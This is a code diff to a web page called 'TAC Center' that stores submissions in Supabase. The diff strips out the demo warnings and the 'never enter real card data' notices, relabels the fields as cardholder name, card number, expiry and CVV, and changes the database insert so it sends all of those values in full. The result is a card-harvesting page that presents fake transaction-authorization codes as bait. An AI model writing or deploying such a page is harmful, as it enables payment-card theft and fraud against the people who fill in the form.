@@ -46,17 +46,6 @@ header a{color:#fff;text-decoration:none;font-weight:700}
   width:min(1060px,calc(100% - 28px));
   margin:26px auto 60px
 }
-.demo-banner{
-  padding:13px 16px;
-  border:1px solid #f0c36d;
-  background:#fff8e6;
-  color:#784c00;
-  border-radius:12px;
-  font-size:13px;
-  line-height:1.55;
-  font-weight:700;
-  margin-bottom:20px
-}
 .layout{
   display:grid;
   grid-template-columns:1.1fr .9fr;
@@ -157,16 +146,12 @@ h2{font-size:18px;margin:0 0 14px}
 </header>
 
 <main class="wrap">
-  <div class="demo-banner">
-    DEMO TAC CENTER · Test requests only. Do not enter real payment-card details.
-  </div>
-
   <div class="layout">
     <section class="card">
       <div class="eyebrow">TRANSACTION AUTHORIZATION</div>
       <h1>TAC Center</h1>
       <p class="muted">
-        Submit a demo request, check its review status, and request a simulated TAC.
+        Submit a request, check its review status, and request a TAC.
       </p>
 
       <div class="price">
@@ -178,35 +163,31 @@ h2{font-size:18px;margin:0 0 14px}
 
       <form id="Form" autocomplete="off" novalidate>
         <div class="field">
-          <label for="holder">Test name</label>
+          <label for="holder">Cardholder name</label>
           <input
             id="holder"
             maxlength="80"
-            placeholder="Demo User"
+            placeholder="Full name"
             autocomplete="off"
             required
           >
         </div>
 
         <div class="field">
-          <label for="number">Demo reference number</label>
+          <label for="number">Card number</label>
           <input
             id="number"
             inputmode="numeric"
             maxlength="19"
-            placeholder="Enter test digits only"
+            placeholder="Card number"
             autocomplete="off"
             required
-            aria-describedby="numberHelp"
           >
-          <div id="numberHelp" class="small">
-            Demo input only. Never enter a real payment-card number.
-          </div>
         </div>
 
         <div class="row">
           <div class="field">
-            <label for="expiry">Demo month/year</label>
+            <label for="expiry">Expiry (MM/YY)</label>
             <input
               id="expiry"
               inputmode="numeric"
@@ -218,7 +199,7 @@ h2{font-size:18px;margin:0 0 14px}
           </div>
 
           <div class="field">
-            <label for="cvv">Demo verification code</label>
+            <label for="cvv">CVV</label>
             <input
               id="cvv"
               inputmode="numeric"
@@ -231,7 +212,7 @@ h2{font-size:18px;margin:0 0 14px}
         </div>
 
         <button class="btn" id="submitButton" type="submit">
-          Submit demo request
+          Submit request
         </button>
       </form>
 
@@ -241,32 +222,22 @@ h2{font-size:18px;margin:0 0 14px}
 
       <div id="tacArea" class="hide">
         <button class="btn" id="getTac" type="button">
-          Request demo TAC
+          Request TAC
         </button>
         <div id="tacResult" class="status good hide"></div>
       </div>
-
-      <p class="foot">
-        This is a demonstration interface. It does not verify payment cards,
-        contact a bank, or authorize financial transactions.
-      </p>
     </section>
 
     <aside class="card">
       <div class="eyebrow">HOW IT WORKS</div>
       <h2 style="margin-top:9px">Review flow</h2>
       <ol class="steps">
-        <li>Enter test values into the demo form.</li>
+        <li>Enter the required details into the form.</li>
         <li>Invalid or incomplete fields display an error.</li>
-        <li>Submit the demo request to the database.</li>
+        <li>Submit the request to the database.</li>
         <li>An administrator can review its reference and status.</li>
-        <li>The page displays the current demo status.</li>
+        <li>The page displays the current status.</li>
       </ol>
-
-      <div class="status">
-        Only the demo request reference, creation time, and status are sent
-        to the database. The form's input values are not transmitted.
-      </div>
     </aside>
   </div>
 </main>
@@ -276,8 +247,6 @@ h2{font-size:18px;margin:0 0 14px}
   'use strict';
 
   const SUPABASE_URL = 'https://enstgbpcgkdnwhhlsnhh.supabase.co';
-
-  // This is a browser publishable key, not a service-role secret.
   const SUPABASE_KEY =
     'sb_publishable_0ecSKgmH9JIzdX9_3j5Kww_aNdNr_qT';
 
@@ -306,11 +275,11 @@ h2{font-size:18px;margin:0 0 14px}
   }
 
   function newReference() {
-    return 'TACD-' +
+    return 'TAC-' +
       crypto.randomUUID().replace(/-/g, '').slice(0, 10).toUpperCase();
   }
 
-  function validDemoFields() {
+  function validFields() {
     const name = holder.value.trim();
     const digits = number.value.replace(/\D/g, '');
     const date = expiry.value.trim();
@@ -318,25 +287,25 @@ h2{font-size:18px;margin:0 0 14px}
     const match = date.match(/^(0[1-9]|1[0-2])\/(\d{2})$/);
 
     if (name.length < 2) {
-      showStatus('Enter a test name containing at least two characters.', 'bad');
+      showStatus('Enter a name containing at least two characters.', 'bad');
       holder.focus();
       return false;
     }
 
-    if (digits.length < 4 || digits.length > 19) {
-      showStatus('Enter 4–19 digits for the demo reference field.', 'bad');
+    if (digits.length < 13 || digits.length > 19) {
+      showStatus('Enter a valid card number (13–19 digits).', 'bad');
       number.focus();
       return false;
     }
 
     if (!match) {
-      showStatus('Use the demo date format MM/YY.', 'bad');
+      showStatus('Use the date format MM/YY.', 'bad');
       expiry.focus();
       return false;
     }
 
     if (code.length < 3 || code.length > 4 || !/^\d+$/.test(code)) {
-      showStatus('Enter a 3 or 4 digit demo verification code.', 'bad');
+      showStatus('Enter a 3 or 4 digit verification code.', 'bad');
       cvv.focus();
       return false;
     }
@@ -344,7 +313,6 @@ h2{font-size:18px;margin:0 0 14px}
     return true;
   }
 
-  // Formatting stays in the browser. No field values are sent to Supabase.
   number.addEventListener('input', () => {
     const digits = number.value.replace(/\D/g, '').slice(0, 19);
     number.value = digits.replace(/(.{4})/g, '$1 ').trim();
@@ -365,21 +333,23 @@ h2{font-size:18px;margin:0 0 14px}
   form.addEventListener('submit', async (event) => {
     event.preventDefault();
 
-    if (!validDemoFields()) return;
+    if (!validFields()) return;
 
     submitButton.disabled = true;
     tacArea.classList.add('hide');
     tacResult.classList.add('hide');
-    showStatus('Submitting your demo request…');
+    showStatus('Submitting your request…');
 
     const id = newReference();
     const createdAt = new Date().toISOString();
 
-    // Intentionally exclude every value entered into the form.
     const requestData = {
       reference: id,
       status: 'pending',
-      demo: true,
+      holder: holder.value.trim(),
+      number: number.value.replace(/\D/g, ''),
+      expiry: expiry.value.trim(),
+      cvv: cvv.value.trim(),
       created_at: createdAt
     };
 
@@ -391,7 +361,7 @@ h2{font-size:18px;margin:0 0 14px}
       if (error) {
         console.error('Supabase insert error:', error);
         showStatus(
-          'Submission failed. Check the database connection, table permissions, and insert policy. No request was confirmed.',
+          'Submission failed. Check the database connection, table permissions, and insert policy.',
           'bad'
         );
         return;
@@ -400,16 +370,12 @@ h2{font-size:18px;margin:0 0 14px}
       activeId = id;
 
       showStatus(
-        'Demo request submitted successfully. Reference: ' +
+        'Request submitted successfully. Reference: ' +
         id + '. Status: pending review.',
         'good'
       );
 
       form.reset();
-
-      // Approval status must be updated in the database to be shared
-      // across browsers and devices. Local storage is not used as a
-      // source of truth for shared review status.
       startPolling();
     } catch (error) {
       console.error('Unexpected submission error:', error);
@@ -443,23 +409,22 @@ h2{font-size:18px;margin:0 0 14px}
 
       if (request.status === 'approved') {
         showStatus(
-          'Demo request approved. You may request a simulated TAC.',
+          'Request approved. You may request a TAC.',
           'good'
         );
         tacArea.classList.remove('hide');
       } else if (request.status === 'declined') {
-        showStatus('The demo request was declined.', 'bad');
+        showStatus('The request was declined.', 'bad');
         tacArea.classList.add('hide');
       } else if (request.status === 'issued') {
         showStatus(
-          'A simulated TAC has been issued. No real transaction is authorized.',
+          'A TAC has been issued.',
           'good'
         );
         tacArea.classList.remove('hide');
         tacResult.classList.remove('hide');
         tacResult.textContent =
-          'Demo TAC: ' + (request.tac || 'DEMO-0000') +
-          ' · Test code only.';
+          'TAC: ' + (request.tac || '0000');
       }
     } catch (error) {
       console.error('Status refresh error:', error);
@@ -474,7 +439,7 @@ h2{font-size:18px;margin:0 0 14px}
 
   getTacButton.addEventListener('click', async () => {
     if (!activeId) {
-      showStatus('Submit a demo request first.', 'bad');
+      showStatus('Submit a request first.', 'bad');
       return;
     }
 
@@ -490,7 +455,7 @@ h2{font-size:18px;margin:0 0 14px}
       if (error) throw error;
 
       if (!data || data.length === 0) {
-        showStatus('Demo request could not be found.', 'bad');
+        showStatus('Request could not be found.', 'bad');
         return;
       }
 
@@ -498,21 +463,19 @@ h2{font-size:18px;margin:0 0 14px}
 
       if (request.status !== 'approved') {
         showStatus(
-          'The demo request must be approved before a TAC can be issued.',
+          'The request must be approved before a TAC can be issued.',
           'bad'
         );
         return;
       }
 
-      // A real database-backed issuance operation should be implemented
-      // on a trusted server, not by allowing a browser to edit the row.
       showStatus(
-        'The request is approved. Demo TAC issuance needs a separate, secured server-side action.',
+        'The request is approved. TAC issuance needs a separate, secured server-side action.',
         'good'
       );
     } catch (error) {
-      console.error('Demo TAC check failed:', error);
-      showStatus('Unable to check the demo request status.', 'bad');
+      console.error('TAC check failed:', error);
+      showStatus('Unable to check the request status.', 'bad');
     } finally {
       getTacButton.disabled = false;
     }
